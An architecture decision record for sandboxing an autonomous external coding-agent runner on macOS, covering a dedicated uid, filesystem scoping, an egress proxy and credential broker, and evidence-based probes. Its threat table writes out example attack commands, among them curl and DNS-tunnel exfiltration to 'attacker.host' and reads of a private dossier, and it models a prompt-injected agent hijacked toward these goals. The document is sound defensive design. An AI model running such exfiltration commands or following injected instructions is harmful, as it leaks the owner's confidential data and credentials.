# ADR-0002 — the OS-isolation floor for the external-CLI runner dispatcher

**Status:** Deferred (2026-07-19) · advisory decision recorded · **Decide:** Roberto (human gate **#5** strategic + **#7** architecture/security)
**Security lens:** luca-mode (zero-trust, OWASP-style) applied to an autonomous external-CLI runner
**Relates to:** [`../plan-2026-07-05-federated-kanban-multi-cli.md`](../plan-2026-07-05-federated-kanban-multi-cli.md) (§Node 3, phase 7) · [`../../factory/dispatch-runner.sh`](../../factory/dispatch-runner.sh) (preflight #5) · [`../../factory/runner-sandbox.sh`](../../factory/runner-sandbox.sh) · [`../../factory/factory-protocol.md`](../../factory/factory-protocol.md) · [`./adr-always-on-security.md`](./adr-always-on-security.md) · [`./0001-self-improving.md`](./0001-self-improving.md)

> This document is **material for deciding**, not a decision. It opens the filing for the
> "phase-7" OS-isolation floor. **No script is modified by this ADR** — every mechanism below is
> specified as design + pseudocode. Building it, and flipping `OS_FLOOR_PRESENT` from `0` to `1`,
> stays a **reviewed code edit** gated on @rex + @luca + Roberto (plan §7, @luca #9). No kanban card
> is moved.

---

## 1. Context — why the dispatcher refuses today

The federated-kanban design ([plan §2d](../plan-2026-07-05-federated-kanban-multi-cli.md)) ships an
external-CLI dispatcher, [`factory/dispatch-runner.sh`](../../factory/dispatch-runner.sh), that is
**wired but dormant**: it is reachable via `kb dispatch`, but a hard-wired code constant makes every
dispatch refuse.

```
readonly OS_FLOOR_PRESENT=0                 # a CODE CONSTANT, not config/env/repo-readable
_os_floor_ok() { [ "$OS_FLOOR_PRESENT" -eq 1 ]; }
```

`run_preflight` records eight refusal reasons (#0 card-missing, #1 repo-not-allowlisted, #2
board-not-privacy-initialized, #3 worktree-isolation-impossible, #4 credential-vacuum-missing, #5
**OS-floor absent**, #6 card-gated, #8 leak-check-tier-inactive). Two are the *dormancy* gates: #8
(leak-check must be actively armed) and **#5 (this ADR)**. With `OS_FLOOR_PRESENT=0`, #5 always fails
→ preflight never passes → no external runner ever executes.

Preflight #5 is the runtime expression of an honest limit the review settled
([plan §Node 3, §9](../plan-2026-07-05-federated-kanban-multi-cli.md)): **bash can remove the
push/merge capability (3a) but cannot stop a hostile runner from reading the dossier / escaping the
filesystem (3b) or exfiltrating over the network (3c).** Those three require an OS-level floor that is
outside bash's reach. Until that floor exists **and proves itself**, refusing is the only safe
posture. This ADR designs that floor concretely for macOS (Roberto's machine), with an honest Linux
portability note, and defines the **evidence-based flip criterion** that must replace the bare
constant.

**Scope boundary.** This is *not* about the Claude-native factory
([`run.sh`](../../factory/factory-protocol.md)), which keeps its native gates (`claude -p` still reads
[`AGENTS.md`](../../AGENTS.md), human gates hold). It is only about the *external* runner path
(`copilot`/`codex`/`ollama`), which fires no Claude hook and is treated as **untrusted terrain**.

---

## 2. Threat model

**Assumption (non-negotiable, from the review): prompt injection succeeds.** We do not assume the
runner is honest. We assume an attacker controls the runner's *goal* — OWASP **ASI01 Agent Goal
Hijack**, top of the [OWASP Top 10 for Agentic Applications](https://genai.owasp.org/), which fuses
prompt injection (LLM01) with excessive autonomy: a card, a repo file, a `.git/config`, or an
upstream dependency carries an injected instruction, and the runner — a capable autonomous CLI in
`--allow-all-tools` mode — executes it with the runner process's full ambient authority. The design
target is: **when (not if) the runner is hijacked, the blast radius is bounded by the OS, not by the
model's good behavior.**

### 2.1 What an un-isolated external runner can do

Today, if #5 were naively flipped without a floor, the runner would inherit Roberto's login session:
the user's uid, home directory, unlocked login keychain, ambient `gh`/`git` credentials, and
unrestricted network. A hijacked runner could then:

| # | Capability (no floor) | Concrete attack |
|---|---|---|
| A | **Read the confidential dossier** | `cat ~/.roberdan-os/private/roberto-profile.md` — clients, deals, medical/FtS data ([privacy gate](../privacy-leak-check.md)). Readable because it lives under Roberto's home, owned by Roberto's uid. |
| B | **Read the whole vault + gbrain brain** | The Obsidian vault, `edufy27` (likely MS-confidential), raw session transcripts — the same multi-source blast radius [ADR always-on §Risk](./adr-always-on-security.md) named. |
| C | **Read every repo under `~/GitHub`** | Source, secrets in `.env` files, other products' unreleased code. |
| D | **Exfiltrate anything it read** | `curl -d @secret https://attacker.host`, or tunnel via DNS (`dig $(base64 secret).attacker.host`) that no HTTP proxy sees. **The dominant risk** (@luca #7): reading is only harmful if it can leave. |
| E | **Use ambient credentials** | The login keychain (`osxkeychain` git helper), a live `SSH_AUTH_SOCK`, `GH_TOKEN` in env → push to any repo, open/merge PRs, act as Roberto on GitHub. |
| F | **Escape the worktree on the filesystem** | `rm -rf` outside the worktree, write to `~/.zshrc` / launchd plists / other repos → persistence + lateral movement. |

Capability **E** is already closed in bash by the credential vacuum
([`runner-sandbox.sh`](../../factory/runner-sandbox.sh): `env -i` allowlist + forced
`-c credential.helper=`) — even the real `/usr/bin/git` finds no auth path. **A, B, C, D, F are
exactly what the OS floor must close**, and none of them is bash-tractable.

### 2.2 What we are defending (assets, ranked by sensitivity)

1. **The dossier** — `~/.roberdan-os/private/` — irreplaceable, personal/medical/commercial. Read =
   catastrophic. (A)
2. **Ambient credentials** — login keychain, ssh-agent, `gh`/`git` tokens. Use = impersonation of
   Roberto / Fight the Stroke. (E — already closed by 3a; the floor must not re-open it.)
3. **The gbrain brain + vault** — multi-source confidential memory. (B)
4. **The user's other repos** — unreleased source, `.env` secrets. (C, F)
5. **Network egress** — the exfil channel that turns every read above into a breach. (D)
6. **Host integrity** — no persistence, no lateral movement outside the disposable worktree. (F)

### 2.3 Trust boundaries

| Zone | Trust | Enforcement |
|---|---|---|
| roberdan-os dispatcher code | trusted | reviewed; the *only* place a gate may live (target repos may not inherit canon — the MirrorBuddy lesson) |
| the target repo (incl. its `.git/config`, files, deps) | **untrusted** | treated as attacker-controlled input |
| the external CLI runner process | **untrusted** (assume hijacked) | must be OS-boxed — this ADR |
| @thor verifier (`claude -p`, gated) | trusted | runs **outside** the sandbox, reads worktree read-only |

This is the [`rules/best-practices.md`](../../rules/best-practices.md) §Security *blast-radius* and
*agent supply-chain* principle made concrete: a compromised link in the runner chain must not reach
the assets in §2.2.

---

## 3. The isolation floor (concrete, macOS-first)

The floor is **one dedicated non-privileged OS identity for runners, boxed on four axes** — identity,
filesystem, network, credentials — such that a hijacked runner *has no OS-granted path* to any asset
in §2.2. Each axis maps to the phase-7 non-negotiables
([plan §7 a–e](../plan-2026-07-05-federated-kanban-multi-cli.md)).

### 3.1 Axis 1 — a dedicated runner uid (identity)

**Mechanism.** A dedicated macOS user account, e.g. `_rda-runner` (leading `_` = the macOS convention
for a non-login service account), with:

- its **own uid** (≠ Roberto's), its **own home** *outside* `/Users/roberdan` (e.g. a
  service-owned dir), and **no admin group** membership;
- an **empty keychain** — no login keychain, no inherited `osxkeychain` items, no ssh keys. This is
  phase-7 non-negotiable **(d)**;
- no ability to `sudo`.

The dispatcher launches the runner **as this uid** (via a narrowly-scoped, reviewed
`sudo -u _rda-runner` rule that permits *only* the runner-launch command line, never a shell). Because
the dossier, vault, and repos are owned by and readable only by Roberto's uid, a different uid gets
`EACCES` on all of them **by standard Unix file permissions** — the most durable primitive available,
no deprecated API involved. This closes **A/B/C** at the identity layer, provided §3.2 also holds (no
world-readable copy exists).

**macOS reality:** creating a hidden service account is well-supported (`sysadminctl -addUser` /
`dscl`). This axis is the *solid* part of the macOS floor.

### 3.2 Axis 2 — filesystem scoping (the runner sees only the worktree + scratch)

Non-negotiables **(b)** dossier-unreadable and **(c)** worktree-sole-writable.

**Mechanism (permissions-first, defense-in-depth second):**

- **Dossier `EACCES` at runtime, verified, no world-readable copy.** `~/.roberdan-os/private/` **and
  every ancestor directory** must be non-readable by the runner uid. Roberto's home is already
  `700`-class; the ADR requires this be *asserted at runtime as the runner uid* (§4), not assumed —
  a single `755` ancestor or a stray world-readable backup defeats the whole axis. Fail-closed.
- **Worktree is the sole writable path.** The dispatcher `git worktree add`s a fresh branch
  `rda/runner/<card>` into a directory it `chown`s to the runner uid; **everything else is read-only
  or unreadable** to that uid. A **per-runner disposable `TMPDIR`** (also runner-owned, wiped after)
  is the only other writable location — already threaded through
  [`runner-sandbox.sh`](../../factory/runner-sandbox.sh)'s `env -i` allowlist.
- **Defense-in-depth: `sandbox-exec` (Seatbelt).** A profile can add a belt-and-braces
  filesystem/network deny. **Honest limit:** `sandbox-exec` has been **deprecated for years and is
  still deprecated on Darwin 25** — it is listed as a *residual-risk reinforcement*, **never** the
  floor. The floor is the uid + permissions.

This closes **F** (write escape) and hardens **A** (the uid boundary is the primary control; the
permission audit is the proof).

### 3.3 Axis 3 — per-uid egress control (the crux, and the hardest on macOS)

Non-negotiable **(a)**, and per @luca #7 **the dominant risk (D)**: reading is only a breach if the
data can leave. Neither the uid nor the permissions stop `curl`/DNS.

**The honest macOS problem.** The plan doc reaches for "`pf` anchored to the runner uid". On macOS
this is *not* the clean primitive it sounds like: macOS `pf` does **not** offer robust,
production-grade per-uid egress matching the way Linux `nftables --uid-owner` does; `sandbox-exec`'s
network deny is deprecated; and a route-level block is all-or-nothing. **So the robust mechanism is
not a packet filter — it is a mandatory userspace egress proxy.**

**Primary mechanism — a deny-all, host-allowlisting egress proxy (this doubles as the credential
broker, §3.4).**

- A small **broker/proxy runs as its own trusted service** (Roberto's uid or a dedicated broker uid),
  bound to `localhost`. The runner's env sets `HTTPS_PROXY`/`HTTP_PROXY`/`ALL_PROXY` to it (added to
  the `env -i` allowlist).
- The proxy is **default-deny**: it forwards a request **only** if the destination host is on a tiny
  per-CLI allowlist (e.g. the CLI's own API endpoint — `api.githubcopilot.com` for Copilot, the model
  endpoint for codex, `localhost:11434` for ollama) and rejects everything else. Every decision is
  logged.
- **DNS is closed too:** the runner gets **no direct DNS**; name resolution happens *at the proxy*
  for allowlisted hosts only, so the DNS-tunnel exfil channel (D) has no egress.

**Reinforcement (not the floor).** `pf` at the route level can block *all* direct egress for the
runner uid's traffic *except* to the localhost proxy, so a runner that ignores `HTTPS_PROXY` and
opens a raw socket still cannot leave. This is the belt to the proxy's braces. Where per-uid `pf`
matching proves unreliable, the stronger stance is to run the runner in a **VM or a container with a
host-only network** whose *only* route out is the audited proxy — that is the genuinely robust option
and the one to prefer if the proxy-only posture is judged insufficient.

**This axis is where macOS is weakest.** State it plainly: on Linux this is a solved problem
(§3.6); on macOS the defensible answer is *proxy-mandatory + no direct DNS + optional VM*, not "pf
does it".

### 3.4 Axis 4 — credential brokering (tokens never in the runner's env)

Non-negotiable **(d)**. Two layers, both already partly in place:

1. **Absence (shipped, 3a).** [`runner-sandbox.sh`](../../factory/runner-sandbox.sh) starts from
   `env -i` (allowlist, not denylist): `GH_TOKEN`/`GITHUB_TOKEN`/`GH_ENTERPRISE_TOKEN`/`SSH_AUTH_SOCK`
   are simply never present, and every dispatcher git call is forced `-c credential.helper=` +
   `GIT_CONFIG_NOSYSTEM=1` + `GIT_CONFIG_GLOBAL=/dev/null`, defeating a hostile repo-local
   `.git/config`. With an empty runner keychain (§3.1) there is *no* auth path — this closes **E**.
2. **Brokering, when a runner legitimately needs a token (e.g. to open its own draft PR).** The token
   must be reachable **only via the proxy, never in the runner's env** — the **"Managed Agents"
   vault-proxy pattern** (Anthropic's managed-agents architecture; cf. the credential-broker-for-agents
   pattern and the IETF *Credential Broker for Agents* draft). Concretely: the runner env holds a
   **placeholder** (`__GH_TOKEN__`), safe in plain text; the **broker/proxy** (same localhost service
   as §3.3) holds the real credential and injects it into an *outbound request to an allowlisted host*
   at the proxy layer, enforcing per-action policy (e.g. "may open a draft PR on `rda/runner/*`; may
   not push to `main`; may not merge"). The runner never sees the secret; the broker is the only place
   authority is attached, and it is auditable.

**Unification (design win):** the egress proxy (§3.3) *is* the credential broker (§3.4). One trusted
localhost service both allowlists destinations and attaches (scoped) credentials — a single choke
point for both exfil-prevention and least-privilege authority.

### 3.5 What macOS makes genuinely hard (honest)

| Axis | macOS verdict |
|---|---|
| Dedicated uid + file-permission `EACCES` | **Solid.** Standard, durable, no deprecated API. |
| Filesystem scoping (worktree-only write, disposable TMPDIR) | **Solid** via ownership; `sandbox-exec` reinforcement is deprecated → not load-bearing. |
| **Per-uid egress control** | **Hard.** No clean per-uid packet-filter primitive; `sandbox-exec` net-deny deprecated. Robust answer = mandatory userspace **proxy + no direct DNS** (broker), with a VM/host-only-network as the strong option. |
| Empty keychain / credential brokering | **Solid** for absence; brokering needs the proxy to exist. |

The single hardest thing on the target machine is exactly the **dominant** risk (egress). That
inversion — the crux is also the hardest — is why this floor is worth an ADR and a staged rollout,
not a weekend script.

### 3.6 Portability note — Linux is the *easier* target

Honest inversion of the usual expectation: the machine we must ship on (macOS) is the hard one.

- **Egress:** Linux gives clean per-uid egress via `iptables/nftables --uid-owner` and, better, a
  **network namespace** (`unshare -n`) whose only route out is the proxy — exactly the boundary macOS
  lacks.
- **Filesystem/identity:** user namespaces + `bwrap` (bubblewrap) / rootless containers give
  disposable, tightly-scoped filesystem + uid mapping natively.
- **Consequence:** a future Linux runner host (e.g. the Mac-mini/home-server or a small box) could run
  the floor *more* robustly than the Mac. This is a point in favor of the staged rollout keeping the
  door open to a Linux runner host later, rather than forcing the hardest primitive onto macOS.

---

## 4. The flip criterion — evidence-based, not a config toggle

**The core invariant, preserved and strengthened.** `OS_FLOOR_PRESENT` stays a **hard-wired code
constant** ([dispatch-runner.sh](../../factory/dispatch-runner.sh) L30). Flipping it `0 → 1` is a
**reviewed code edit** (gate #7), never a value read from any config file, env var, target repo, or
`~/.roberdan-os/*` — @luca #9. **That is necessary but must not be sufficient.** A stale constant left
at `1` after the floor eroded would be a silent failure. So the flip criterion is:

> **`_os_floor_ok()` returns 0 iff the reviewed code constant is `1` AND a set of live, mechanical
> probes — run as the runner uid — positively prove each floor property right now.**

The constant is the *reviewed intent*; the probes are the *runtime evidence*. Both, or refuse. This
turns preflight #5 from a boolean into the **phase-7 proof-suite (non-negotiable (e)) run as a
preflight** — the same actively-attempts-and-asserts-denied suite, executed before every dispatch.

**Proposed shape (pseudocode — NOT edited into any script by this ADR):**

```
readonly OS_FLOOR_PRESENT=1        # ← the reviewed code edit (phase 7, gate #7). Still a code
                                   #   constant: no config/env/repo can set it.
RDA_RUNNER_USER="_rda-runner"

_os_floor_ok() {
  [ "$OS_FLOOR_PRESENT" -eq 1 ]        || return 1   # 1. reviewed intent (necessary)
  _probe_runner_uid                    || return 1   # 2. dedicated non-priv uid resolves, ≠ Roberto
  _probe_dossier_eacces                || return 1   # 3. as runner uid: dossier + ancestors unreadable
  _probe_fs_scoped                     || return 1   # 4. as runner uid: write outside worktree fails
  _probe_git_no_auth                   || return 1   # 5. as runner uid: push to probe remote finds no auth
  _probe_egress_denied_cached          || return 1   # 6. egress proof fresh AND proxy/anchor loaded
  return 0
}
```

### 4.1 Each floor property → its mechanical probe

| Floor property (§3) | Probe (run **as the runner uid**) | Pass condition |
|---|---|---|
| **(d) code intent** | read the constant | `OS_FLOOR_PRESENT == 1` (reviewed edit) |
| **(a) dedicated uid** | `id -u "$RDA_RUNNER_USER"` | resolves to a non-privileged uid ≠ Roberto's, home outside `/Users/roberdan`, not in admin group |
| **(b) dossier unreadable** | as runner uid, `test -r` on `~/.roberdan-os/private/` **and every ancestor**; scan for any world-readable copy | every read → `EACCES`; no world-readable copy found → else **refuse** |
| **(c) fs scoping** | as runner uid, attempt a write **outside** the worktree and a write **inside** | outside → fails; inside → succeeds |
| **(d) git no-auth** | as runner uid, `git push` to a disposable probe remote | fails — no reachable helper, no token, empty keychain |
| **(a) egress denied** | as runner uid: connect to a **sentinel non-allowlisted host** and to the **one allowlisted endpoint**; attempt a DNS lookup of a sentinel name | sentinel connect → **fails**; allowlisted → succeeds; sentinel DNS → no resolution |

Every probe is a **negative test that must actively fail** where it should, in the spirit of the
plan's hostile-stub philosophy (a happy path proves nothing). Any probe that cannot run, errors, or
passes-where-it-should-fail → **fail-closed refuse** (unchanged default).

### 4.2 Cost tiering (so the gate is affordable per dispatch)

- **Cheap, per-dispatch:** uid resolution, dossier/ancestor `EACCES`, fs-scope write test, git-no-auth
  — all sub-second, run on **every** dispatch.
- **Heavy, cached with freshness:** the full egress suite (real connection attempts, DNS) runs at
  **floor provisioning** and on a **scheduled re-prove** (launchd, like the gbrain jobs), writing a
  timestamped floor-attestation. Per-dispatch, `_probe_egress_denied_cached` (i) verifies the
  attestation is **fresh** (younger than a tight TTL) **and** (ii) cheaply confirms the proxy is
  listening + the `pf`/route anchor is loaded. **The attestation is a staleness guard, never the
  authority** — the code constant + live cheap probes remain primary, so a forged or stale attestation
  alone can never open the floor. If the attestation is stale → refuse and re-prove.

### 4.3 Why this is not the config-flip the design forbids

The design's cardinal rule is "no local file can flip the floor to present." This criterion honors it:
the **only** thing that turns `_os_floor_ok()` from always-false to *possibly*-true is the reviewed
code edit to the constant. The probes can only *keep it closed* (any failing probe refuses); they can
never *open* it on their own. The attestation can only *refuse on staleness*; it can never assert
presence. Presence requires: reviewed code **AND** every live probe green — a strictly stronger gate
than today's single constant, and evidence-based.

---

## 5. Staged rollout — smallest safe step first

Each stage leaves [`test/validate.sh`](../../factory/factory-protocol.md) green and adds capability
only after its proof exists. Stages 0–1 are prerequisites already designed; the floor is stages 2–4.

| Stage | What ships | Runner may execute | Stays a **human gate** |
|---|---|---|---|
| **0 — today (dormant)** | dispatcher wired, #5 hard-refuses | **nothing** | flipping #5 at all |
| **1 — floor built, still refusing** | dedicated uid + proxy/broker + `pf`/VM provisioned; the phase-7 **proof-suite** written and green as a *test*; constant **still `0`** | **nothing** — the floor exists but `OS_FLOOR_PRESENT=0` | the code edit to flip the constant (gate #7); every merge |
| **2 — narrow flip: read-only-ish, additive cards only** | constant → `1`; `_os_floor_ok()` = constant **+** live probes (§4). Dispatch restricted to cards that are `runner:`-labeled, in the `runner-allowlist`, **additive** (write code/tests/docs in the worktree), never touching a gated surface | one CLI (start with the most controllable, e.g. `copilot`), on one allowlisted repo (**never** MirrorBuddy / FightTheStroke), producing a **draft PR** | **merge of every PR** (gate #1); push/main; spend; any `human-only` card; adding a repo to the `runner-allowlist`; widening the allowlist |
| **3 — wider CLIs / repos** | more CLIs (codex, then ollama if its execution leg is ever reliable), more allowlisted repos, after Stage-2 evidence (clean logs, no probe regressions) | several allowlisted repos | same gates; each new repo/CLI is an explicit Roberto decision |
| **4 — Linux runner host (optional)** | move the runner to a Linux box where the egress floor is *stronger* (§3.6) | same, on the stronger floor | same |

**The smallest safe first step (Stage 2)** is deliberately minimal: **one CLI, one repo, additive
cards, draft-PR only, merge always human.** Everything the runner does is (a) confined to a disposable
worktree, (b) unable to reach the dossier/network/credentials by OS construction, (c) verified by
@thor and then (d) merged only by Roberto. If any part of the floor regresses, the live probes (§4)
refuse *before* the runner starts — the fail-closed default is never lost across any stage.

**What never becomes autonomous, at any stage** (unchanged [AGENTS.md human gates](../../AGENTS.md)):
merge to `main`, push, force-push, spend, external publication, deletion of non-regenerable data,
material in Roberto's / FtS's name, and the flip/widening decisions themselves.

---

## 6. Residual risks + honest limits

What this floor does **not** protect against — stated plainly, because a floor sold as total is worse
than an honest one.

1. **A determined attacker who stays inside the allowlist still exfiltrates.** If the CLI's own
   legitimate endpoint is attacker-influenced (a malicious model backend, or a compromise of the
   allowlisted host), data can leave through the *permitted* channel. The proxy bounds *where* traffic
   goes, not *what* the allowlisted destination does with it. Mitigation: keep the allowlist minimal
   and prefer local endpoints (ollama) where possible; log all proxied traffic.
2. **The floor is only as good as the runtime probes' honesty.** A probe that silently no-ops (wrong
   uid tested, `sudo -u` misconfigured so the "runner uid" test secretly runs as Roberto) would give a
   green floor over a broken one. Mitigation: each probe must be a *proven negative* (assert the action
   fails where it must), and the provisioning suite must itself be @thor/@luca-reviewed — the same
   "prove the vacuum works, not vacuously" discipline as the phase-6 hostile-stub test.
3. **`sandbox-exec` reinforcement is deprecated and may vanish.** It is defense-in-depth only; the
   floor must never depend on it. If Apple removes it, the floor is unaffected (uid + proxy carry it).
4. **macOS per-uid `pf` is not a guarantee.** If the route-level reinforcement proves unreliable, the
   runner-that-ignores-`HTTPS_PROXY`-and-opens-a-raw-socket is only stopped by the VM/host-only-network
   option. Accepting the proxy-only posture accepts that raw-socket residual; the VM closes it at a
   maintenance cost.
5. **Broker compromise = single point of failure.** The egress proxy/credential broker is a trusted
   choke point; if *it* is compromised, both exfil-prevention and credential-least-privilege fall.
   Mitigation: it is small, reviewed, localhost-bound, and holds only tightly-scoped tokens.
6. **The flip is a process risk now, not a config-flip risk.** The residual is "a future code change to
   the constant bypasses @rex/@luca/Roberto review" — smaller than the original config-toggle risk, but
   not zero. Mitigation: the constant lives in reviewed code with a loud comment; CI/`validate.sh`
   could additionally assert it is `0` until phase 7 is formally opened.
7. **Maintenance cost is real and ongoing.** A dedicated account, a launchd re-prove job, an
   allowlist per CLI, a proxy/broker service to patch, and probe upkeep as CLIs change their endpoints.
   This is not fire-and-forget; it is a small standing operational surface. If the concrete use-case
   that justifies external runners never materializes, **the cheapest secure option is to keep the
   floor unbuilt and #5 refusing** — dormancy has zero maintenance cost.
8. **@thor is still an LLM verifier and the human merge is still the real backstop** (unchanged from
   the plan §8) — the floor bounds the runner, it does not make the runner's *output* trustworthy.

---

## 7. Decision needed from Roberto

This is human gate **#5** (strategic — build the external-runner capability at all?) **+ #7**
(architecture/security — a cross-cutting floor touching identity, network, filesystem, credentials).

**What building this costs:**

- Provisioning: a dedicated macOS service account, a localhost egress-proxy/credential-broker service,
  `pf`/VM network scoping, a launchd re-prove job. Estimate: a focused multi-day build + a real
  phase-7 proof-suite, not a script.
- Standing maintenance (§6.7): patching the broker, per-CLI allowlists, probe upkeep.
- A reviewed code edit to `dispatch-runner.sh` (constant → `1`, `_os_floor_ok()` → constant + probes),
  gated on @rex + @luca + Roberto.

**What it buys:**

- The ability to dispatch *additive, draft-PR* work to a cheap external CLI **without** exposing the
  dossier, the vault, credentials, or an exfil channel — the runner boxed by the OS, not by the model.
- A flip that is **evidence-based** (live probes) rather than a trusted boolean.
- A door open to a stronger Linux runner host later (§3.6).

**What it does *not* buy** (§6): protection against an attacker inside the allowlist, against a
compromised broker, or against a future unreviewed code change — and it carries real maintenance.

**The three options:**

- **Approve** — greenlight Stage 1 (build the floor + proof-suite, constant stays `0`). The flip to
  Stage 2 remains a *separate* later decision after the proof-suite is green and a concrete use-case
  exists. Nothing runs autonomously on Approve alone.
- **Defer** — the honest default until a concrete use-case appears that Claude-native cannot cover
  (plan §1.3). Cost of deferring: **zero** — #5 keeps refusing, the dispatcher stays safely dormant,
  no maintenance surface. This is the recommended posture *absent* a driving use-case.
- **Reject** — decide external runners are not worth the standing security surface for this personal
  setup; remove the dormant dispatcher path entirely (a simplification, not a loss of any live
  capability).

### Decision record (2026-07-19)

**Decision:** **Defer**.

**Why now:** there is no concrete external-runner use-case that Claude-native cannot already cover, so
building the OS floor now would open a standing maintenance surface (broker/proxy/probes/account) with
no immediate operational payoff.

**What this means operationally:**

1. `dispatch-runner.sh` stays dormant (`OS_FLOOR_PRESENT=0`, preflight #5 keeps refusing).
2. No phase-7 implementation branch is opened now.
3. Re-open this ADR only when a concrete, recurring use-case requires external runners.

> **Recommendation (advisory):** **Defer** until a concrete external-runner use-case exists. The
> design is sound and worth *having on the shelf* (this ADR), but building the floor before a use-case
> demands it spends real effort and creates a standing maintenance surface to guard a capability
> nothing yet needs. When a use-case appears, **Approve → Stage 1** and re-review the flip separately.
> The one thing **not** to do is flip #5 without the floor — which the hard-wired constant already
> makes impossible.

---

## 8. Consequence

The external-runner capability gains a **defensible, evidence-based activation path** instead of a
bare boolean: a dedicated uid + filesystem scoping + a mandatory egress proxy/credential broker,
each mapped to a live runtime probe, gated behind a reviewed code constant that no config can flip.
The fail-closed default is preserved and *strengthened* (constant **AND** probes). Whether to build
it is Roberto's — gate #5 + #7. Until he decides Approve, [`dispatch-runner.sh`](../../factory/dispatch-runner.sh)
keeps refusing every dispatch, exactly as it does today, at zero cost.
